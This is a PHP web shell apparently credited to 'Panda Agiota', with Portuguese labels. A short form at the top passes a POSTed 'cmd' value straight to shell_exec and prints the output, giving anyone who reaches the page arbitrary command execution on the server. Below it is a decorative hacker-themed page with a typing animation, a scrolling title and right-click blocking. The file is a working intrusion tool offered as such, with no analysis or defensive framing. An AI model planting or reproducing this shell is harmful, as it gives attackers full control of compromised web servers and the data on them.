<form method="post">
	<h1>Webshell: <input value="whoami" type="text" name="cmd"/></h1>
	<input style="padding:25px 50px;" type="submit" value="Executar" />
</form>
<?php
	if(isset($_POST['cmd']))
	{
		$cmd = $_POST['cmd'];
		$result = shell_exec($cmd); //aqui que a magica acontece
		echo "<pre>".$result."</pre>";
	}
?>
 <body style="background-attachment: fixed;" vlink="red" alink="#ff0000" bgcolor="black" lang="EN-US" link="#646464"><p align="center">&nbsp;</p>
 </object> 

 
 
   <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
 
 
<html xmlns="http://www.w3.org/1999/xhtml"> 
 
  <head> 
  <SCRIPT LANGUAGE="JavaScript"> 
 
      <!-- Begin
 
      function popUp(URL) {
 
        day = new Date();
 
        id = day.getTime();
 
        eval("page" + id + " = window.open(URL, '" + id + "', 'toolbar=0,scrollbars=0,location=0,statusbar=0,menubar=0,resizable=0,width=550,height=550,left = 408,top = 109');");
 
      }
 
      --> 
 
    </script> 
    <style> 
 
      td
 
      {
 
        background-color: #1f1f1f;
 
        font-family: Courier New;
 
        font-size:20pt;
 
        color:#00fffb;
 
        border-color: #ffffff;
 
        border-width:1pt;
 
        border-style:solid;
 
        border-collapse:collapse;
 
        padding:0pt 3pt;
 
        vertical-align:top;
 
      }
 
      table
 
      {
 
        border-color: #88aace;
 
        border-width:0pt 1pt;
 
        border-style:dash;
 
      }
 
      A:Link, A:Visited
 
      {
 
        color: #88aace;
 
      }
 
      A.no:Link, A.no:Visited
 
      {
 
        color: #88aace;
 
        text-decoration: none;
 
      }
 
      A:Hover, A:Visited:Hover , A.no:Hover, A.no:Visited:Hover
 
      {
 
        color: #88aace;
 
        background-color:#2e2e2e;
 
        text-decoration:
 
        overline underline;
 
      }
 
      .style1
 
      {
 
        color: #88aace
 
      }
 
      .style2
 
      {
 
        color: 1f1f1f
 
      }
 
      body
 
      {
 
        color:white;
         
        background-position:center;
 
        background-attachment:fixed;
 
        </div>
 
      }
 
    </style> </head> 
 
  <BODY bgColor="#000000" onLoad="teclear();" oncontextmenu="return false" onselectstart="return false"> 
 
    <DIV align="center"><SPAN style="FILTER: blur(add=1,direction=170,strength=30); HEIGHT: 50px"> 
 
    <STYLE> 
 
      .layermensaje {
 
        FONT-SIZE: 10pt;LINE-HEIGHT: 10pt; FONT-FAMILY: "Arial"
 
      }
 
    </STYLE> 
 
    <FONT style="FONT-SIZE: 8pt" face="Courier New"> 
 
      <script type="text/javascript"> 
 
        var charIndex = -1;
 
        var stringLength = 0;
 
        var inputText;
 
        function writeContent(init)
 
        {
 
          if(init)
 
          {
 
            inputText = document.getElementById('contentToWrite').innerHTML;
 
          }
 
          if(charIndex==-1)
 
          {
 
            charIndex = 0;
 
            stringLength = inputText.length;
 
          }
 
          var initString = document.getElementById('myContent').innerHTML;
 
          initString = initString.replace(/<SPAN.*$/gi,"");
 
 
 
          var theChar = inputText.charAt(charIndex);
 
          var nextFourChars = inputText.substr(charIndex,4);
 
          if(nextFourChars=='<BR>' || nextFourChars=='<br>')
 
          {
 
            theChar  = '<BR>';
 
            charIndex+=3;
 
          }
 
          initString = initString + theChar + "<SPAN id='blink'>></SPAN>";
 
          document.getElementById('myContent').innerHTML = initString;
 
 
 
          charIndex = charIndex/1 +1;
 
          if(charIndex%2==1)
 
          {
 
            document.getElementById('blink').style.display='none';
 
          }
 
          else
 
          {
 
            document.getElementById('blink').style.display='inline';
 
          }
 
          if(charIndex<=stringLength)
 
          {
 
            setTimeout('writeContent(false)',100);
 
          }
 
          else
 
          {
 
            blinkSpan();
 
          }
 
        }
 
        var currentStyle = 'inline';
 
        function blinkSpan()
 
        {
 
          if(currentStyle=='inline')
 
          {
 
            currentStyle='none';
 
          }
 
          else
 
          {
 
            currentStyle='inline';
 
          }
 
          document.getElementById('blink').style.display = currentStyle;
 
          setTimeout('blinkSpan()',400);
 
        }

        msg = "-- WebShell1Agiota ++";
 
 
 
        msg = " " + msg;pos = 0;
 
        function scrollMSG()
 
        {
 
          document.title = msg.substring(pos, msg.length) + msg.substring(0, pos);
 
          pos++;
 
          if (pos >  msg.length) pos = 0
 
          window.setTimeout("scrollMSG()",100);
 
        }
 
        scrollMSG();
 
      </script> 
 
            <center>Webshell mod by Panda Agiota<br /><br /> 
 
              <img src="https://media.tenor.com/images/9e711e726f78a12950aa7da20034039a/tenor.gif" width="600" height="300" alt="Logo"><br /><br /><br /> <table width="800" height="0"> 
 
          <tr> 
 
            <td> 
 
              <div id="myContent" class="tip"> 

              </div> 
 
              <div id="contentToWrite" style="display:none" text-decoration:"overline" class="tip"> - Webshell... RODANDO!</div>

             </td> 
 
          </tr> 
 
        </table> 
        <p>&nbsp;</p> 
 
        <script type="text/javascript"> 
 

         writeContent(true);
 
        </script> 
        <form name="form1" method="post" action=""><h3><strong>WEBSHELL!!!!</strong></h3>
        </form>
      </center> 
 
      <center>        
 
      </center> 
 
          </body> 
 
 

</html> 


